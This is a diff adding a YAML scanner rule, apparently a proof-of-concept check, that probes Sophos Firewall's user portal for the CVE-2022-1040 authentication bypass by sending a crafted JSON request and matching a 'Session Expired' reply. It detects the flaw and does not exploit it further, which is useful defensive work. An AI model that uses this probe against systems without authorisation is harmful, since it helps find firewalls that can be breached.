@@ -1,0 +1,21 @@
+name: poc-yaml-sophosfirewall-bypass
+manual: true
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: "/userportal/Controller?mode=8700&operation=1&datagrid=179&json={\"\U0001F99E\":\"test\"}"
+            headers:
+                X-Requested-With: XMLHttpRequest
+        expression: |
+            response.status == 200 && response.body.bcontains(b"{\"status\":\"Session Expired\"}")
+expression: r1()
+detail:
+    author: Henry4E36(https://github.com/Henry4E36)
+    links:
+        - https://attackerkb.com/topics/cdXl2NL3cR/cve-2022-1040
+    vulnerability:
+        id: CT-402895
+        level: critical
